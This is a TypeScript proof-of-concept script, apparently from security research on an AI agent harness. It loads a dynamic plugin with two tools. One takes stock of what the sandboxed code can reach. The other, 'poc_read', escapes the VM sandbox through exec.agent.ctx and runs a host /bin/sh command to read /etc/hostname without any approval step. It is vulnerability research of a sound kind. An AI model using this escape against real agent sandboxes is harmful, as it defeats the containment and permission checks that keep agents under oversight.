/**
 * 对比同一个动态包的两种执行能力：
 *   (1) vm_probe —— 域内能力盘点，不逃逸：沙箱代码手里到底有哪些全局？
 *                   它能读文件吗？
 *   (2) poc_read —— POC 逃逸：沙箱域 execute 顺着 exec.agent.ctx
 *                   让宿主 /bin/sh 读同一个文件。
 * 在默认权限下运行（只读 —— 无需审批）。
 *
 * 从 DeepSeek Harness checkout 根目录运行：
 *   cd deepseek-harness
 *   node_modules/.bin/tsx ../dsh-security-pocs/scripts/vm-vs-poc-probe.ts
 */
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { Context } from '@deepseek-ai/cordis'
import Timer from '@deepseek-ai/cordis-plugin-timer'
import SystemPrompt from '@deepseek-ai/dsh-system-prompt'
import ToolRegistry from '@deepseek-ai/dsh-tools'
import LocalSubprocessRuntime from '@deepseek-ai/dsh-subprocess-local'
// 新版（>=0.1.5）中 CallId 不再是 dsh-llm 的导出；callId 只是注册表透传的调用标识。
const CallId = (value: string) => value as never
import type { Agent } from '@deepseek-ai/dsh-agent'
import type { SessionId } from '@deepseek-ai/dsh-session/types'

// 源码检出目录：默认上一级的同名兄弟目录，可用 DSH_CHECKOUT 覆盖
// （本文件位于 scripts/ 子目录，故向上两级）。
const here = dirname(fileURLToPath(import.meta.url))
const checkout = resolve(process.env.DSH_CHECKOUT ?? join(here, '..', '..', 'deepseek-harness'))
const { default: DynamicCordisRunnerService } = await import(
  join(checkout, 'packages/extensions/cordis-host-runner/src/index.ts'),
)

const HOST_CODE = `
  return {
    name: 'vm-vs-poc',
    inject: ['tools'],
    apply(ctx) {
      // (1) 域内探针：不逃逸时，vm 代码手里有什么？
      harness.registerTool(ctx, harness.defineTool({
        name: 'vm_probe',
        description: 'inventory vm realm capabilities',
        parameters: {},
        output: {
          schema: { type: 'string' },
          render(_args, value) { return [{ type: 'text', text: value }] },
        },
        async execute(_args, _exec) {
          const probe = {
            haveHarness: typeof harness,
            haveConsole: typeof console,
            haveProcess: typeof process,
            haveFs: typeof fs,
            haveBuffer: typeof Buffer,
            haveRequire: typeof require,
            requireAttempt: (() => {
              try { require('node:fs'); return 'LOADED' }
              catch (e) { return 'ERR ' + e.name + ': ' + e.message }
            })(),
            readAttempt: (() => {
              try { return JSON.stringify(fs.readFileSync('/etc/hostname', 'utf8')) }
              catch (e) { return 'ERR ' + e.name + ': ' + e.message }
            })(),
          }
          return JSON.stringify(probe)
        },
      }))

      // (2) POC 逃逸：宿主 shell 读同一个文件。
      harness.registerTool(ctx, harness.defineTool({
        name: 'poc_read',
        description: 'read via escaped host shell',
        parameters: {},
        output: {
          schema: { type: 'string' },
          render(_args, value) { return [{ type: 'text', text: value }] },
        },
        async execute(_args, exec) {
          const real = exec.agent.ctx
          const subprocess = real.get('subprocess')
          const handle = subprocess.spawn({
            argv: ['/bin/sh', '-c', 'echo ---host-shell-read---; cat /etc/hostname; echo ---end---'],
            cwd: '/',
            stdio: { stdin: 'ignore', stdout: 'inherit', stderr: 'inherit' },
            graceMs: 1000,
          })
          await handle.done
          return 'host shell read finished'
        },
      }))
    },
  }
`

const ctx = new Context()
await ctx.plugin(LocalSubprocessRuntime)
await ctx.plugin(Timer)
await ctx.plugin(SystemPrompt)
await ctx.plugin(ToolRegistry)
await ctx.plugin(DynamicCordisRunnerService)

const AGENT = { id: 'S-vmp' as SessionId, steer() {}, inject() {}, ctx } as unknown as Agent
const runner = ctx.dynamicCordisRunner

const { pluginId, packageId } = runner.define({
  sessionId: AGENT.id,
  plugin: { kind: 'new', idPrefix: 'vmps' },
  name: 'vm-vs-poc',
  purpose: 'comparison',
  code: { host: HOST_CODE },
})
const receipt = await runner.run(AGENT, pluginId, packageId, 'run')
if (!receipt.ok) throw new Error(receipt.message)
console.log('[cmp] dynamic package mounted and running:', receipt.ok)

async function execTool(name: string) {
  const result = await ctx.tools.execute({
    signal: new AbortController().signal,
    callId: CallId('cmp-' + name),
    name,
    arguments: {},
    agent: AGENT,
  })
  return result.content
    .filter((block) => block.type === 'text')
    .map((block) => block.text)
    .join('')
}

console.log('\n=== (1) vm_probe: in-realm capability inventory (no escape) ===')
console.log(await execTool('vm_probe'))

console.log('\n=== (2) poc_read: same file via POC-escaped host shell ===')
console.log(await execTool('poc_read'))

process.exit(0)
